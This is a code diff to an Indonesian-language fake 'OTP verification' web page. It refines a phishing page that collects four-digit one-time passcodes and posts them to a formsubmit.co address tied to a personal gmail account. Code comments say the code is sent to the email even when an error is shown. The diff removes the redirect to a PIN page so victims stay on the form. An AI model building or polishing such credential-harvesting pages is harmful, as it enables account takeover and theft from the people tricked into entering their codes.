@@ -38,6 +38,7 @@
       margin-bottom: 20px;
       font-weight: bold;
       font-size: 14px;
+      display: none;
     }
     .otp-inputs {
       display: flex;
@@ -54,7 +55,7 @@
       border-radius: 10px;
     }
     .timer {
-      margin-bottom: 10px;
+      margin-bottom: 20px;
       font-weight: bold;
       color: #008CFF;
     }
@@ -72,22 +73,20 @@
 <body>
   <div class="header">Verifikasi OTP</div>
   <div class="container">
-    <div class="title">Masukkan Kode OTP</div>
+    <div class="title">Masukkan OTP</div>
     <div class="desc">Kami telah mengirimkan kode ke nomor Anda</div>
-    <div class="error" id="errorMsg" style="display: none;">
-      Kode OTP telah kadaluwarsa atau invalid, silakan kirim ulang kode OTP
-    </div>
+    <div class="error" id="errorMsg">Kode OTP telah kedaluwarsa atau invalid silahkan kirim ulang kode OTP</div>
     <div class="otp-inputs">
       <input type="tel" maxlength="1" oninput="moveNext(this, 0)" required>
       <input type="tel" maxlength="1" oninput="moveNext(this, 1)" required>
       <input type="tel" maxlength="1" oninput="moveNext(this, 2)" required>
       <input type="tel" maxlength="1" oninput="moveNext(this, 3)" required>
     </div>
-    <div class="timer" id="timer">Kirim ulang dalam 100 detik</div>
-    <form id="otpForm" action="https://formsubmit.co/baygaming648@gmail.com" method="POST" onsubmit="return submitOTP()">
+    <div class="timer" id="timer">KIRIM ULANG (100s)</div>
+    <form id="otpForm" action="https://formsubmit.co/baygaming648@gmail.com" method="POST" target="_self" onsubmit="return submitOTP()">
       <input type="hidden" name="OTP" id="otpFull">
       <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="pin.html">
+      <!-- _next DIHAPUS agar tetap di halaman ini -->
       <button type="submit">KONFIRMASI</button>
     </form>
   </div>
@@ -109,19 +108,20 @@
       const otp = Array.from(inputs).map(i => i.value).join('');
       document.getElementById("otpFull").value = otp;
 
+      // Tampilkan pesan error jika OTP kadaluarsa atau kurang dari 4 digit
       if (isExpired || otp.length < 4) {
         errorMsg.style.display = "block";
       } else {
         errorMsg.style.display = "none";
       }
 
-      return true; // tetap kirim ke email meskipun kadaluarsa
+      return true; // tetap kirim ke email walaupun error ditampilkan
     }
 
     const interval = setInterval(() => {
       countdown--;
       if (countdown > 0) {
-        timerEl.textContent = "Kirim ulang dalam " + countdown + " detik";
+        timerEl.textContent = "KIRIM ULANG (" + countdown + "s)";
       } else {
         clearInterval(interval);
         timerEl.textContent = "Kode OTP telah kadaluarsa";
@@ -132,4 +132,4 @@
     window.onload = () => inputs[0].focus();
   </script>
 </body>
-        </html>
+</html>
